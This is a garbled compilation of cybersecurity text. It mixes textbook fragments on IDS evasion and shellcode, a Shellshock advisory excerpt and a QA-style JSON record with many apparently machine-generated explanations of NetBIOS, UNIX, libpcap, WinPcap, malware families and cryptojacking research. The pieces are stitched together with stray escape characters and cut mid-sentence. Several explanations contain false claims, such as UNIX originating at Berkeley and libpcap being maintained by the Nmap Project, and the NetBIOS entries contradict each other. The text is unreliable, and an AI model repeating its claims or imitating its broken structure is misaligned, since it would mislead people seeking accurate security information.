The patch was submitted in a commit with the commit message \"af-packet: TPACKET_V3 flexible buffer implementation.\"\n\nThe AF-Packet subsystem is a Linux kernel module that provides a flexible packet processing framework for various network protocols. It allows userspace applications to send and receive packets directly from the kernel without the need for a full network stack.\n\nThe patch that Pettersson submitted includes a fix for a specific issue where changing the packet version while using the packet_setsockopt function could lead to a deadlock. To resolve this issue, Pettersson took the lock at the start of packet_set_ring, ensuring that the lock is acquired before any other operations are performed.\n\nThe commit was signed off by three individuals: Pettersson himself, Eric Dumazet, and David S. Miller. The \"Signed-off-by\" lines indicate that these individuals have reviewed and approved the changes made in the patch.\n\nOverall, Pettersson's contribution to the Linux kernel's AF-Packet subsystem demonstrates his expertise in network programming and his ability to identify and resolve complex issues in the Linux kernel.\n\n\n L.

Additional information can be found on Fedora Magazine.  * * *  ## Update 2014-09-25 16:00 UTC  Red Hat is aware that the patch for CVE20146271 is incomplete. An attacker can provide specially-crafted environment variables containing arbitrary commands that will be executed on vulnerable systems under certain conditions. The new issue has been  assigned CVE20147169.  We are working on patches in conjunction with the upstream developers as a critical priority. For details on a workaround, please see the knowledgebase article.  Red Hat advises customers to upgrade to the version of Bash which contains the fix for CVE20146271 and not wait for the patch which fixes CVE20147169. CVE20147169 is a less severe issue and patches for it are being worked on.  * * *  Bash or the Bourne again shell, is a UNIX like shell, which is perhaps one of the most installed utilities on any Linux system. From its creation in 1980, Bash has evolved from a simple terminal based command interpreter to many other fancy uses.  In Linux, environment variables provide a way to influence the behavior of software on the system. They typically consists of a name which has a value assigned to it. The same is true of the Bash shell. It is common for a lot of programs to run Bash shell in the background. It is often used to provide a shell to a remote user (via ssh, telnet, for example), provide a parser for CGI scripts (Apache, etc) or even provide limited command execution support (git, etc)  Coming back to the topic, the vulnerability arises from the fact that you can create environment variables with specially-crafted values before calling the Bash shell. These variables can contain code, which gets executed as soon as the shell is invoked. The name of these crafted variables does not matter, only their contents. As a result, this vulnerability is exposed in many contexts, for example:\\'\\n\\'A few basic evasion principles apply to NIDSs. First, the attacker can cause the IDS to process packets differ-ently than the target system. 4,7This attack works because the IDS often resides on a different part of the network oron a different operating system. Second, the intruder canoverload the IDS or analyst so that the attack packet is ei-ther dropped or missed in a \ufb02urry of alerts. For example,alert-\ufb02ooding tools, such as IDS stimulators, are designedto generate considerable network traf\ufb01c speci\ufb01cally tai-lored to \ufb01re alerts in NIDSs. 8Third, the intruder can modify or encode the attack to exploit processing differ-ences between the IDS and target application. T o bypass aNIDS signature looking for directory traversal (for exam-ple, \u201c /\u201d), the attacker replaces the \u201c /\u201d with its hexadeci- mal equivalent, \u201c 0x2f \u201d. Next, the attacker can develop a new attack that the IDS isn\u2019t yet programmed to detect, called a 0-day attack . For instance, the MS03-007 ntdll.dll vulnerability (http://support.microsoft.com/kb/815021) was \ufb01rstdiscovered after a backdoor signature alert. Finally, the in-truder can attempt to hide the attack as normal activity, aless serious attack, or an entirely new attack. 9For exam- ple, mimicry attacks target HIDSs by modifying the exploit characteristics to mimic those of a legitimate applica-tion. 10,11Additionally, in Snort versions before 2.0.0, Darren Mutz and his colleagues found that it was possibleto trigger mismatched alerts, which could be mistaken forlesser alerts such as port scans, by making an exploit ap-pear to be one that occurred higher in the rule set. 8 Polymorphic shellcode Attackers originally customized many buffer-over\ufb02owexploits for the Unix operating system to provide a com-mand shell on the target computer. The art of construct-ing more compact, complex, and functional shellcodehas advanced signi\ufb01cantly since then. 12Shellcode can be\\'\\n\\'1The Armv8.2-A extension optionally increases this limit to 52 bits [26].Virtual Address Bits 0-11 Offset 12-20 L3 Table Page 21-29 L2 Table Block 30-38 L1 Table Block 39-47 L0 TableResult Fig. 1.

As we mentioned in Section 2.3, KERNEXEC and UDEREF were recently ported to the AArch32 architec- ture [90]. In addition to providing stronger address space separation, the authors made an effort to \ufb01x the permis- sions of the kernel in AArch32, by enforcing the W^X property for the majority of RWX pages inphysmap . However, as the respective patch is currently under de- velopment, there still exist regions inside physmap that are mapped as RWX. In kernel v3.8.7, we identi\ufb01ed a ~6MBphysmap region mapped as RWX that enabled the execution of plain shellcode in our ret2dir exploit. The most recent kernel version for which we found a publicly-available exploit is v3.8. Thus, to evaluate the latest kernel series (v3.12) we used a custom exploit.

A free Win32 version of libpcap called WinPcapwas developed by researchers at Politecnico di Torino and is available athttp://netgroup-serv.polito.it/winpcap. WinPcap forms the basis for some interestingsniffing tools. However, it is awkward to install from a remote, command-line-only per-spective and often requires a reboot, in contrast to the dynamically loaded BUTTsnifferand fsniff. We mention some tools based on it here for the sake of comprehensiveness andwith an eye for further developments in the future.WinDump WinDump was written by the authors of WinPcap, and it is modeled on thepopular UNIX tcpdump utility.\\'\\n\\'However, Sourcefire does market a commercial version (theSourcefire Intrusion Sensor), which is based on the Snort detection enginebut adds other components such as a friendlier interface, reporting, policymanagement, and a full support package (www.sourcefire.com).Snort is claimed at the time of writing to have well over 150,000 activeusers and to have been downloaded over 3 million times (www.snort.org).Although the superiority of open-source software, especially in the securityarena, is sometimes overstated, Snort is a fine example of how continuingreview and testing by a community of experienced programmers and admin-istrators can benefit a product.www.syngress.com168 Chapter 5 \u2022 Botnet Detection: Tools and Techniques\\\\x0cInstallationTo install Snort on Windows, you need to install the open-source packet-cap-ture driver WinPCap (Windows Packet Capture Library).

Fortunately, Loris Degioanni and team set about the task of port-ing the popular UNIX packet capture library libpcap to the Windowsoperating system. Their success introduced WinPcap, now in its thirdrevision, and opened the world of packet capture to aspiring Windowsprogrammers. Many excellent UNIX tools now have fully functioningWin32 equivalents thanks to the work of the WinPcap team and count-less developer hours.Both of the tools we discuss in this chapter are UNIX descendentsand require the WinPcap library.

It was originally developed by the Nmap Project, which is best known for its network exploration and security auditing tool, Nmap.\n\nWinPcap provides a low-level interface for intercepting and manipulating network traffic on a Windows system. It does this by acting as a filter driver for the Windows network stack. This means that it can intercept and process network packets before they are passed up to higher-level network software, such as applications or protocol stacks.\n\nThe WinPcap library includes a user-mode component, WinPcap.dll, which provides an API for applications to interact with the packet capture and injection functionality. It also includes a kernel-mode driver, Filtpcap.sys, which is responsible for intercepting and processing network packets.\n\nWinPcap was first released in 1997 and quickly became a popular tool for network administrators, security professionals, and developers. However, in 2011, the WinPcap project was discontinued, and the Nmap Project forked the codebase to create a new version called Npcap. Npcap is a drop-in replacement for WinPcap, with improved performance, stability, and compatibility with newer versions of Windows.\n\nThe quote you provided celebrates the 10th anniversary of Npcap, which was first released in 2011. The\n\n\n WinPCAP is a open-source WinSock-based packet capture (pcap) library and utility for the Microsoft Windows operating system. It provides the ability to intercept, filter, and analyze data traffic on a computer network in real-time. WinPCAP is widely used in network security, network troubleshooting, and network development.\n\nIn the context of the provided information, WinPCAP is a required library or component for running the Python scripts: S7-1200-Workshop.py, SiemensScan.py, Schneider-Scanner.py, and Mitsubishi.py. These scripts are designed to interact with Programmable Logic Controllers (PLCs) from different manufacturers, specifically Siemens, Schneider, and Mitsubishi.\n\nS7-1200-Workshop.py is a simple script for reading inputs and setting outputs on Siemens S7-1200 PLCs with firmware version 3 or lower. WinPCAP is used in a WinPCAP compatible mode when using this script.\n\nSiemensScan.py is an elaborate script for scanning and hacking Siemens PLCs, and possibly other systems. WinPCAP is used in this script to capture and analyze network traffic for the purpose of identifying and exploiting vulnerabilities in the targeted systems.\n\nSchneider-Scanner.py is a simple Broadcast scanner for Schneider PLC\n\n\n LibPCAP, or the Library for Packet Capture and Analysis, is a powerful and widely-used open-source C language library for intercepting, filtering, and processing network data in real-time. It was originally developed by the Tcpdump Group and is now maintained by the Nmap Project.\n\nThe primary function of LibPCAP is to provide a low-level interface for capturing and analyzing network traffic. It does this by allowing applications to read and write packet data directly from the network interface, bypassing the operating system's network stack. This gives LibPCAP the ability to perform packet filtering, packet modification, and other advanced network analysis tasks.\n\nLibPCAP is often used as a foundation for other network security tools, such as Wireshark, Tcpdump, and Nmap. These tools use LibPCAP to capture and analyze network traffic, providing users with a wealth of information about the network activity.\n\nThe lists you've mentioned, such as Declan McCullagh's Politech, TCPDump/LibPCAP Dev, Security Incidents, Vulnerability Development, and Vulnerability Watch, are likely to be related to network security and may discuss the use of LibPCAP and other network security tools. The old-school private security digests mentioned, such as Zardoz at SecurityDigest.Org, may also discuss the use of LibPCAP and other network security tools, as well as other network security-related topics.\n\nIf you're interested in network security and want to learn more about LibPCAP\n\n\n UNIX Tools refer to the various utilities and applications that are available in the UNIX operating system. UNIX is a family of operating systems that was first developed in the 1970s and has since become a popular choice for servers and workstations due to its stability, flexibility, and powerful command-line interface.\n\nIn the context of the provided information, UNIX Tools are mentioned in several sections of a research paper. Here's a detailed description of each mention:\n\n7.1 The State of the Art:\nIn this section, the authors discuss the current state of the art in software testing, specifically in the context of UNIX Tools. They mention that UNIX Tools have been widely used for software testing due to their flexibility and ease of use. They also discuss various testing techniques that have been used with UNIX Tools, such as fuzz testing and regression testing.\n\n7.2 Fuzzing in the Future:\nThis section discusses the future of fuzz testing, which is a software testing technique that involves providing random or semi-random data to a program to identify bugs and vulnerabilities. The authors mention that UNIX Tools can be used for fuzz testing, and they discuss some of the challenges and benefits of using UNIX Tools for this purpose.\n\nA Literature Survey:\nIn this section, the\n\n\n UNIX is a family of operating systems that was developed in the 1970s at the University of California, Berkeley. It is a multi-user, multi-tasking, and multi-processing system that is known for its robustness, reliability, and security. UNIX is based on a modular design, with a clear distinction between the operating system and applications.\n\nIn the context of testing, UNIX operating systems, including various versions of UNIX and Linux, can be tested using various methods. One common method is to test network services, which can include any TCP network service such as ICMP (Ping), HTTP, POP3, SMTP, FTP, and SSH. These tests can be used to determine the availability of these services, as well as their response time and other performance metrics.\n\nAnother method of testing UNIX systems is to gather system information. This can include metrics such as the processor 5-minute load average, disk usage, and messages that are critical. These tests can be performed using native clients on UNIX, Linux, and Windows operating systems.\n\nUNIX also supports SNMP (Simple Network Management Protocol) tests and traps natively. SNMP is a protocol used for managing and monitoring networked devices, and UNIX systems can act as both SNMP agents and managers.\n\nCustom tests can also be performed on UNIX systems using scripts written in languages such as bash or Perl. These scripts can be used to automate complex testing tasks, such as testing the performance of specific applications or services, or monitoring system logs for specific events.\n\nOverall, UNIX operating\n\n\n"}

With the increase of the transmitted data volumes t he threats  for intrusion of false data entered into the CAN bu s by hackers  and malicious users have grown significantly. The p roblem is  critical because incorrect data such as false data for the  surrounding environment (e.g. other vehicles, pedes trians,  traffic lights) may cause serious damages and may e ven cost  human lives.

NetBIOS was developed in the late 1980s by IBM and Novell as a way to enable communication between different types of computers and operating systems.\n\nNetBIOS is a sessionless, connectionless protocol that operates at the transport layer of the OSI model. It provides a common interface for applications to access network resources, such as files, printers, and communication services. NetBIOS uses a unique identifier called a NetBIOS name or a Universal Naming Convention (UNC) path to identify resources on the network.\n\nNetBIOS uses a series of messages to establish communication between devices on the network. These messages include queries, responses, and acknowledgments. NetBIOS also supports broadcasting, which allows a device to send a message to all devices on the network.\n\nASPIKE is a fuzzing platform that uses a different approach to determine packet sizes compared to traditional fuzzing tools. Instead of pre-constructing all higher-layer protocols to determine sizes, ASPIKE defers size calculations until blocks are closed. This means that no layer needs to know the internals of any other layer. Blocks can be nested or intertwined in any way, depending on the network protocol being modeled.\n\nFragmentation of packets is one area where this\n\n\n Network Basic Input/Output System (NetBIOS) is a programming interface originally developed by IBM for the Intel 8088 microprocessor in the late 1970s and early 1980s. NetBIOS was designed to provide a common set of interfaces for accessing various hardware resources, such as the keyboard, display, and disk drives, in a networked environment.\n\nNetBIOS is not a protocol in the same sense as DNS, NTP, CLDAP, CharGEN, SSDP, BitTorrent, SNMPv2, Kad, or Quote of the Day (QOTD). Instead, it is a set of application programming interfaces (APIs) and protocols that enable applications to interact with the network and access network resources.\n\nNetBIOS provides a uniform way for applications to communicate with different types of hardware and software on a network. It includes a session layer, a presentation layer, and an application layer, which allow applications to establish connections, exchange data, and perform various network services.\n\nOne of the most well-known NetBIOS applications is the File and Printer Sharing for Microsoft Windows, which uses NetBIOS over TCP/IP to enable file and printer sharing between Windows systems on a network. NetBIOS also supports other network services, such as name resolution (using the Name Service Protocol, or NBP), session establishment (using the Session Service Protocol, or SSP), and remote procedure calls (using the Remote Procedure Call,\n\n\n NetBIOS (Network Basic Input/Output System) is a programming interface and set of protocols developed by Microsoft and IBM in the late 1980s for creating networked applications on Intel x86-based computers.

It was widely used in local area networks (LANs) that used the IPX/SPX protocol stack, as well as in early implementations of the TCP/IP protocol suite.\n\nNetBIOS relies on a session layer protocol called NetBIOS Over TCP/IP or NetBIOS over IP (NBI), which allows NetBIOS applications to run over IP networks. NetBIOS uses a series of messages called NetBIOS Session Service (NBS) messages to establish, maintain, and terminate sessions between applications.\n\nNetBIOS uses a unique 16-bit identifier called a NetBIOS name or a NetBIOS session key to identify resources on the network.

It is primarily distributed through exploits, phishing emails, and drive-by downloads from compromised websites. Once installed on a victim's machine, it can carry out various functions such as stealing sensitive data, performing DDoS attacks, and downloading and installing additional malware onto the infected system. One notable feature of Andromeda is its use of domain generation algorithms (DGA) for command and control (C2) communication, which allows it to dynamically generate new domain names for communicating with its operators. This makes it more resilient to takedown efforts aimed at disrupting its infrastructure.\n\nPandora, on the other hand, refers to a type of Android malware discovered in 2017 that targeted users in China.

{"query": "What are the differences between JHUHUGIT and Carberp?\n", "time": 9.194580316543579, "ground_truth": " Based on the contextual information provided, JHUHUGIT is a type of malware associated with the advanced persistent threat (APT) group known as APT28, also referred to as Fancy Bear or Sednit. JHUHUGIT is reportedly derived from the Carberp source code. While I do not have real-time access to specific databases or resources to provide a detailed comparison, I can highlight some potential differences between these two pieces of malware based on general knowledge and common practices in the cybersecurity industry:\n\n1. **Purpose and Functionality**: Carberp is primarily designed for financial gain through activities such as unauthorized bank transfers and stealing sensitive data. On the other hand, JHUHUGIT appears to serve a different purpose, acting as reconnaissance malware for APT28. Its primary function might include exploring targeted networks, gathering information about the environment, and identifying potential targets for future attacks.\n\n2. **Command and Control (C&C) Infrastructure**: The C&C infrastructure refers to the servers and communication channels that allow attackers to control compromised systems remotely. Since JHUHUGIT is based on Carberp's source code, it may use similar C&C techniques. However, APT groups like APT28 often employ more sophisticated and resilient C&C structures than cybercrime organizations focusing on financial gains. As a result, JHUHUGIT's C&C infrastructure could be more complex and harder to detect than Carberp's.\n\n3. **Obfuscation Techniques**: Malware authors frequently use various obfuscation techniques to evade detection by security solutions. Given that JHUHUGIT is derived from Carberp, they might share several obfuscation methods. Nevertheless, APT groups usually invest significant effort into customizing their tools; thus, JHUHUGIT could incorporate additional or modified obfuscations compared to its Carberp predecessor.\n\n4. **Targeted Industries and Geographies**: Cybercriminal groups like those using Carberp typically focus on any organization that offers profitable opportunities. Meanwhile, APT groups like APT28 tend to target specific industries or geographic regions aligned with their sponsors' interests. Therefore, JHUHUGIT might concentrate on particular sectors or countries more than Carberp does.\n\nPlease note that this response provides a high-level overview based on typical differences observed between malware families and APT groups.

To answer your question, I will focus on differentiating KOCTOPUS from the Octopus component within KOCTOPUS, considering they often appear together. Please note that KOCTOPUS is a loader used to launch various payloads like Octopus and others (e.g., Koadic and QuasarRAT). In contrast, Octopus is one of those potential payloads. Here are the main differences between them:\n\n1. Purpose and Functionality:\n- KOCTOPUS acts as a loader with the primary purpose of deploying other tools such as Octopus, Koadic, or QuasarRAT onto target systems. It utilizes specific techniques like PowerShell command execution, registry manipulation, and UAC bypass mechanisms to ensure successful deployment.\n- On the other hand, Octopus serves as a post-exploitation framework primarily designed for lateral movement inside a Windows domain environment. Its features include remote access, host enumeration, credential dumping, and more.\n\n2. Operation Independence:\n- While KOCTOPUS requires external scripts or binaries to perform actions, it does not rely on any particular toolset itself. Instead, it deploys these additional components based on user preferences or requirements.\n- Octopus can operate independently once deployed using KOCTOPUS or alternative methods because it contains built-in capabilities for reconnaissance and exploitation tasks.

The term \"cryptominer\" is used to describe software that uses a computer's processing power to mine cryptocurrencies without the user's knowledge or consent.\n\nIn the context of the provided information, there are two separate incidents related to Monero Cryptominer. The first incident, \"Relaying Potatoes: Another Unexpected Privilege Escalation Vulnerability in Windows RPC Protocol,\" discusses a vulnerability in the Windows Remote Procedure Call (RPC) protocol that could be exploited to install a Monero Cryptominer. The attacker could use this vulnerability to gain administrative privileges on a Windows system and then install the Monero Cryptominer to mine the cryptocurrency.\n\nThe second incident, \"Caught in the Cloud | How a Monero Cryptominer Exploits Docker Containers,\" discusses a different method of distributing Monero Cryptominer. In this case, the attackers exploited a vulnerability in Docker containers to install the Monero Cryptominer. Docker is a popular platform for developing, shipping, and running applications using container technology. The attackers could use compromised Docker images to install the Monero Cryptominer on systems that use Docker to run applications.\n\nBoth incidents highlight the importance\n\n\n Vasek et al. are researchers who have conducted a comprehensive empirical analysis of Distributed Denial of Service (DDoS) attacks in the context of cryptocurrency mining, specifically focusing on the impact of these attacks on hash rate.\n\nHash rate refers to the computational power used to validate transactions and create new blocks in a blockchain network. Miners compete to solve complex mathematical problems to validate transactions and add new blocks to the blockchain. The higher the hash rate, the more secure and decentralized the network is.\n\nIn the context of cryptocurrency mining, DDoS attacks can be used to disrupt the network and prevent miners from accessing the blockchain. The adversary in these attacks uses a large number of compromised devices or bots to flood the network with requests, exhausting the resources of the miner or the network as a whole.\n\nFor example, an honest miner may be congested with fraudulent transactions or requests from a large number of clients acting under the control of an adversary. After a while, the miner will likely start discarding all incoming inputs/requests, including those from honest clients. This can result in a significant decrease in hash rate, making the network less secure and decentralized.\n\nVasek et al. have studied the impact of these attacks on hash rate in detail. They have analyzed various aspects of DDoS attacks on cryptocurrency mining, including the size and duration of the attacks, the types of attacks used, and the effectiveness of different countermeasures. Their research provides valuable insights into the nature and impact of DDoS attacks on hash rate and the broader implications for the security and decentral\n\n\n In the context of the provided information, a \"Window\" in this context is likely referring to the Microsoft Windows operating system and its associated binary files or applications. The information suggests that researchers are studying malware that targets the Windows operating system, specifically in contrast to malware designed for Android systems.\n\nThe text mentions that Android malware and Windows malware differ in various ways. For instance, the repackaging technique, which involves modifying legitimate software to include malicious code, is more common in Android APKs (Android Application Packages) than in Windows binary files.\n\nAdditionally, the researchers in the study are employing a more systematic approach to malware development hunting on Windows systems than in a previous study. They have added an automated validation phase to their methodology.\n\nThe approach mentioned in [30] for mining Windows malware development in Anubis is not explicitly stated in the provided text. However, it can be inferred that Anubis is a tool or platform used for the research. The term \"mining\" in this context likely refers to the process of extracting information or insights from the Windows malware samples.\n\nOverall, the text suggests that researchers are studying Windows malware and comparing it to Android malware, employing a more systematic approach and using Anubis as a tool for their research.\n\n\n WannaCryptor, also known as WannaCry or WanaCrypt0r, is a type of malware that emerged in 2017 and belongs to the ransomware family, specifically the Wana family. This malware gained notoriety due to its widespread and damaging attacks, particularly against organizations and enterprises around the world.\n\nAccording to various reports from security and cyber defense companies, including Kaspersky, SonicWall, WeLiveSecurity, and others, WannaCryptor is one of the most common ransomware families, alongside Locky, TeslaCrypt, Cerber, GandCrab, Locker, TorrentLocker, WannaCry, Stop, CryptoJoker, Dharma, and CrypWall.\n\nFrom 2006 to 2015, different versions of both symmetric and asymmetric ransomware were prevalent. However, starting from 2016, the use of ransomware began to increase significantly, with WannaCryptor being one of the most destructive and widespread variants.\n\nWannaCryptor is a self-replicating malware that exploits a vulnerability in Microsoft Windows operating systems, specifically the SMB (Server Message Block) protocol. Once the malware infects a system, it encrypts files and demands a ransom payment in the form of Bitcoin to decrypt them. The ransom note left by the malware informs the victim that they have 72 hours to pay the ransom before the\n\n\n Botnet Bots, also known as zombie computers or just bots, are a type of malware that turns infected computers or devices into part of a larger network of compromised systems, controlled by attackers, known as a botnet. These bots can perform various malicious activities, one of which is data collection. They are often used to gather sensitive information such as passwords, login credentials, and other valuable data from the victim's device or network.\n\nRecently, attackers have begun using cryptocurrencies like Bitcoin to receive payments for their illegal activities, instead of traditional bank transactions. This trend has led to an increase in the use of botnets to mine cryptocurrencies or to launch Distributed Denial of Service (DDoS) attacks against Bitcoin nodes or exchanges.\n\nBotnet bots can be installed on a victim's device through various means, such as phishing emails, malicious software downloads, or exploiting vulnerabilities in outdated software. Once installed, the botnet malware can control many computers and infected systems, creating a powerful network that attackers can use to launch DDoS attacks against specific servers. These attacks can cause significant damage by overwhelming the targeted server with traffic, making it unavailable to legitimate users.\n\nIn the context of the provided information, it is essential to note that botnet bots are not limited to collecting data or launching DDoS attacks. They can also be used to mine cryptocurrencies, spread malware, or carry out other malicious activities. The use of Bitcoin for payments adds an additional layer of complexity to\n\n\n Wannacry is a type of malware, specifically a ransomware attack that spread globally in May 2017. The name Wannacry comes from a combination of the words \"WannaCrypt0r\" and \"ransomware.\" The attack used the EternalBlue exploit, which targeted a vulnerability in the Microsoft Windows SMB (Server Message Block) protocol.\n\nIn the context of the provided references, Wannacry is not directly mentioned in any of them. However, the references do discuss topics related to malware and security, which can provide some context to understand the significance of Wannacry.\n\nThe first reference by Zain, Damasevi\u010d, and Abdulkareem ([54]) discusses image-based malware classification using the VGG19 network and spatial convolutional attention. This research is focused on developing a system to detect and classify malware based on images of malware samples. The Wannacry malware is not specifically mentioned in this paper, but it is an example of a malware attack that could potentially be detected and classified using such a system.\n\nThe second reference by Franz ([\n\n\n Distributed Denial-of-Service (DDoS) is a type of cyber-attack that aims to make a network or a particular service unavailable by overwhelming it with traffic from multiple sources. In the context of communication networking protocols, a DDoS attack is carried out by distributing the traffic across a large number of sources, making it difficult for the targeted network or service to distinguish legitimate traffic from malicious traffic and respond accordingly.\n\nIn the case of Bitcoin, which is a decentralized digital currency, the distributed nature of its network and consensus protocol makes it less vulnerable to traditional Denial-of-Service (DoS) attacks. However, attackers have adapted to this by launching more powerful Distributed Denial-of-Service (DDoS) attacks against Bitcoin-related services, such as currency exchanges, mining pools, and eWallets.\n\nThe primary goal of a DDoS attack against Bitcoin services is to disrupt their availability and prevent legitimate users from accessing them. This can result in financial losses, reputational damage, and even compromise the security of the targeted service.\n\nA DDoS attack against Bitcoin services typically involves the use of botnets, which are networks of compromised computers or devices that can be controlled remotely by attackers. The attackers use these botnets to generate large amounts of traffic, often in the form of fake transactions or requests, which are then directed towards the targeted Bitcoin service.\n\nThe distributed nature of the attack makes it difficult for the targeted service to distinguish legitimate traffic from malicious traffic and respond accordingly. This can result in the service being overwhelmed and unable to process legitimate transactions or requests, effectively denying service to its users.\n\n\nModern malware refers to the latest types of malicious software that are designed to harm devices, particularly computers, laptops, smartphones, and other connected devices. Malware is short for malicious software, and it includes various types of threats such as viruses, worms, ransomware, spyware, adware, and cryptojackers.\n\nIn the context of the provided information, modern malware includes cryptojackers and mobile malware. Cryptojacking is a type of malware that hijacks devices to mine cryptocurrencies without the owner's knowledge or consent. This can result in decreased device performance, increased electricity usage, and potential damage to the device. Cryptojacking attacks can be delivered through various vectors, including email attachments, malicious websites, and software vulnerabilities.\n\nMobile malware, on the other hand, is a type of malware that targets mobile devices, such as smartphones and table\n\n\nCrypto Ransomware is a type of malicious software, or malware, designed to encrypt files on a victim's computer or network, rendering them inaccessible. The name \"crypto\" comes from the use of encryption algorithms to scramble the data. Once the files are encrypted, the ransomware demands a payment, typically in the form of cryptocurrency, in exchange for the decryption key.\n\n1. Process Injection (PI): Crypto ransomware often uses process injection techniques to execute its code in the memory of running processes. This allows the malware to evade detection and analysis by security software.\n2. Anti-Debugging (AD): To prevent detection and analysis, crypto ransomware may employ anti-debugging techniques. These methods can include checking for debuggers, disabling breakpoints, and terminating processes that are suspected to be debuggers.\n3. Scanning (Sc):\n\n\n I. INTRODUCTION\n\nThe blockchain-based cryptocurrencies have gained significant attention and popularity beyond specialized industries like finance and technology. Cryptocurrencies offer decentralized digital transactions, eliminating the need for intermediaries and providing anonymity. However, this innovation has also attracted malicious actors, leading to an increase in cryptojacking attacks.\n\nII. CRYPTOJACKING\n\nCryptojacking is a type of malware that surreptitiously uses a victim's computing resources to mine cryptocurrencies without their consent. The primary goal of cryptojacking is to generate revenue for the attacker by exploiting the victim's resources. This can lead to financial losses for individuals and organizations due to increased electricity consumption, decreased system performance, and potential hardware damage.\n\nIII. BROWSER-BASED CRYPTOJACKING\n\nBrowser-based cryptojacking is a subset of cryptojacking that targets web browsers. This type of attack utilizes malicious scripts, often embedded in websites or advertisements, to mine cryptocurrencies in the background while the user is browsing. One of the most popular tools used for browser-based cryptojacking is Coinhive.\n\nIV. COINHIVE\n\nCoinhive is a JavaScript miner that allows websites to monetize their traffic by using visitors' computing power to mine Monero (XMR), a popular privacy-focused cryptocurrency. While Coinhive was initially designed as a legitimate tool for website monetization, it has been widely adopted by cybercriminals for unauthorized mining.\n\nV. UNAUTHORIZ\n\n\nE. Chovancov \u00b4a is an author of a research paper titled \"A Clustered Hybrid Honeypot Architecture,\" published in Acta Polytechnica Hungarica in October 2019. In this paper, Chovancov \u00b4a and his co-author \u00b4A. Norbert propose a new architecture for a hybrid honeypot system. A honeypot is a security system designed to attract and detect cyber attacks. Hybrid honeypots combine the features of production systems and honeypots, allowing researchers to study real-world attacks while also providing protection for actual systems.\n\nThe authors describe their architecture as clustered because it consists of multiple honeypots that communicate and cooperate with each other. Each honeypot in the cluster runs a specific service or application to attract different types of attacks. The authors also discuss the use of machine learning algorithms to analyze the behavior of\n\n\n T. Mursch is a cybersecurity researcher or expert who is part of a team that published a research paper titled \"A first look at the crypto-mining malware ecosystem: A decade of unrestricted wealth\" in the context of the Security and Privacy Analytics conference held in New York, NY, USA, in March 2017. The paper was co-authored with M. Oulehla, Z. K. Oplatkova\u2019, and D. Malanik.\n\nThe research focused on the detection of crypto-mining malware using neural networks, which is a type of machine learning algorithm. The team presented their findings at the Future Technologies Conference in San Francisco, CA, USA, in December 2016, as indicated in the first reference [48].\n\nCrypto-mining malware is a type of malicious software that surreptitiously uses the computing resources of an infected computer or network to mine cryptocurrencies, such as Bitcoin or Monero, without the user's knowledge or consent. The researchers aimed to develop a detection system to identify and mitigate the spread of such malware.\n\nThe second reference [49] is not related to T. Mursch or the research paper. It is a link to Alexa\n\n\n Ali Aydin Selcuk is one of the authors of a research paper titled \"Defending Against Cryptojacking Malware: Application Agnostic Approach\" published in the 51st Annual IEEE/IFIP International Conference on Dependable Systems and Networks (DSN) in 2021. The paper can be found at this link: <https://www.arxiv-vanity.com/papers/2103.03851/>.\n\nThe paper discusses the issue of cryptojacking malware, which is a type of malware that covertly uses the computational resources of a victim's device to mine cryptocurrencies without their consent. The authors aim to provide a defense mechanism against such malware that is application agnostic, meaning it can protect various applications from cryptojacking attacks.\n\nThe authors of the paper are Ege Tekiner, Abbas Acar, A. Selcuk Uluagac, Engin Kirda, and Ali Aydin Selcuk. Ali Aydin Selcuk is one of the five authors of the paper.\n\nThe\n\n\n Kinsing is a type of malware, specifically a cryptocurrency miner, that was discovered to be spread through the exploitation of a vulnerability in Apache ActiveMQ, identified as CVE-2023-46604. This vulnerability allowed attackers to download and infect Linux systems with the Kinsing malware.\n\nApache ActiveMQ is an open-source message broker platform written in Java. The vulnerability, CVE-2023-46604, is a deserialization remote code execution (RCE) flaw. This means that an attacker could send a specially crafted message to an Apache ActiveMQ server, causing it to execute arbitrary code. In this case, the attackers used this vulnerability to download and install the Kinsing malware on the compromised Linux systems.\n\nOnce installed, Kinsing uses the affected system's resources to mine Monero cryptocurrency. This type of malware is also known as h2miner, as it is based on the H2 mining software. Kinsing is designed to evade detection by using various techniques, such as changing its configuration and mining parameters to blend in with legitimate mining processes.\n\nThe spread of Kinsing through the Apache ActiveMQ vulnerability was reported in November 2023. This incident highlights the importance of keeping software up-to-date and applying security patches prompt\n\n\nJ. Olivares-Mercado is an author or researcher who has contributed to the field of cybersecurity, specifically in the area of malware attack trends and defense mechanisms. The context of this information can be found in a review article titled \"State-of-the-Art Malware Attack Trends and Defense Mechanisms\" authored by J. Ferdous and colleagues, published in the journal Sensors in 2022.\n\nIn this article, the authors discuss various malware attack trends and defense mechanisms. One of the sections of the article focuses on cryptojacking, which is a type of malware that secretly uses a victim's computing resources to mine cryptocurrency. In this section, there is a subsection titled \"On detecting cryptojacking on websites: Revisiting the use of classifiers,\" which was authored by F. A. Aponte-Novoa, D. P. \u00c1l\n\n\n Eskandari is a research team or researchers, specifically Eskandari et al., who have focused on the analysis and detection of crypto-jacking attacks using botnets. Crypto-jacking is a type of cyber attack where unauthorized cryptocurrency mining is performed on a victim's device or website. Botnets are networks of compromised computers or devices that can be controlled remotely to carry out coordinated cyber attacks.\n\nThe Eskandari team has developed a framework to detect malicious behaviors related to cryptocurrency mining code in suspected websites. Their framework analyzes the code of these websites to identify any potential crypto-jacking activities. The team's research has been evaluated using Alexa's Top 1 Million websites, which are the most frequently visited websites on the internet.\n\nBy analyzing the code of these websites, the Eskandari team is able to identify new trends towards in-browser mining and the financial impacts of such attacks. In-browser mining refers to the use of a web browser to mine cryptocurrencies, which can be more difficult to detect and block compared to traditional mining malware. The financial impacts of crypto-jacking attacks can be significant, as they can result in increased electricity bills for victims, decreased website performance, and potential damage to the reputation of the affected website or organization.\n\nOverall, the Eskandari team's research is important in understanding the growing threat of crypto-jacking attacks using botnets and developing effective methods for detecting and mitigating these attacks. Their work highlights the need for continued research and development in the field of cybersecurity, particularly as the use of cryptocurrencies and other emerging technologies continues to grow.\n\n\n Wannacry, also known as WannaCrypt or WannaCrypt0r, is a type of malware, specifically a ransomware attack that spread rapidly across the internet in May 2017. The name Wannacry comes from a combination of the words \"WannaCrypt\" and \"ransomware.\"\n\nThe primary objective of Wannacry was to encrypt files on a victim's computer and demand a ransom payment in the form of Bitcoin to decrypt them. However, what made Wannacry particularly noteworthy and dangerous was its ability to exploit a vulnerability in Microsoft Windows operating systems, specifically those that had not been patched against the EternalBlue exploit. This exploit, developed by the National Security Agency (NSA), had been leaked online, and Wannacry used it to propagate itself from one vulnerable computer to another on a network.\n\nThe vulnerability that Wannacry exploited, 